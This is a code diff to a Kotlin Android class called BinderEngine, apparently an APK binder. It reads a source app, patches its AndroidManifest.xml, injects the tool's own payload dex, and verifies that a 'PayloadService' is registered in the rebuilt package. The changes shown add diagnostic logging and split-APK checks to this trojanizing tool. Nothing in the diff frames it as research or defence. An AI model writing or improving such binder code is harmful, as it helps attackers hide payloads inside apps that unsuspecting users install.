@@ -67,14 +67,33 @@ class BinderEngine(private val ctx: Context) {
             if (base.length() < 1024) throw IllegalStateException("Invalid APK file")
             emit(LogLevel.INFO, "Source APK: " + base.length() / 1024 + " KB")
 
+            val originalInfo = try {
+                ctx.packageManager.getPackageArchiveInfo(
+                    base.absolutePath,
+                    PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
+                )
+            } catch (_: Throwable) {
+                null
+            }
+            if (originalInfo == null) {
+                emit(LogLevel.ERROR, "ORIGINAL APK unreadable by Android")
+            } else {
+                emit(LogLevel.INFO, "Original package: " + originalInfo.packageName)
+                emit(LogLevel.INFO, "Original activities: " + (originalInfo.activities?.size ?: 0))
+            }
+
             val srcZip = ZipFile(base)
             val manifestEntry = srcZip.getEntry("AndroidManifest.xml")
                 ?: throw IllegalStateException("No AndroidManifest.xml in APK")
             val manifest = srcZip.getInputStream(manifestEntry).use { it.readBytes() }
 
+            emit(LogLevel.INFO, "Original manifest: " + AxmlPatcher.stats(manifest))
+            if (AxmlPatcher.stats(manifest).contains("app=0")) {
+                emit(LogLevel.WARN, "No <application> in manifest -> this is a SPLIT apk")
+            }
+
             val originalApp = AxmlPatcher.readApplicationName(manifest)
             emit(LogLevel.INFO, "Original application: " + (originalApp ?: "(none)"))
-            emit(LogLevel.INFO, "Manifest size: " + manifest.size + " bytes")
 
             emit(LogLevel.INFO, "Patching AndroidManifest.xml...")
             val patched = try {
@@ -90,6 +109,7 @@ class BinderEngine(private val ctx: Context) {
                 throw IllegalStateException("Manifest patch failed: " + (t.message ?: "unknown"))
             }
             emit(LogLevel.SUCCESS, "Manifest patched: " + manifest.size + " -> " + patched.size)
+            emit(LogLevel.INFO, "Patched manifest: " + AxmlPatcher.stats(patched))
 
             emit(LogLevel.INFO, "Collecting payload dex...")
             val dexes = collectOwnDex()
@@ -185,10 +205,7 @@ class BinderEngine(private val ctx: Context) {
                 val srv = info.services?.mapNotNull { it.name } ?: emptyList()
                 val hasSrv = srv.any { it.endsWith("PayloadService") }
                 emit(if (hasSrv) LogLevel.SUCCESS else LogLevel.ERROR, "Payload service: " + hasSrv)
-                emit(
-                    LogLevel.INFO,
-                    "Activities: " + acts.joinToString(", ")
-                )
+                emit(LogLevel.INFO, "Activities: " + acts.joinToString(", "))
             }
 
             val cleanLabel = label.substringAfterLast('/')
@@ -213,8 +230,7 @@ class BinderEngine(private val ctx: Context) {
         } finally {
             try {
                 val stamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-                val logName = "Hs_Binder_Log_" + stamp + ".txt"
-                val logDoc = outDir.createFile("text/plain", logName)
+                val logDoc = outDir.createFile("text/plain", "Hs_Binder_Log_" + stamp + ".txt")
                 if (logDoc != null) {
                     ctx.contentResolver.openOutputStream(logDoc.uri)!!.use { os ->
                         os.write(logLines.joinToString("\n").toByteArray())
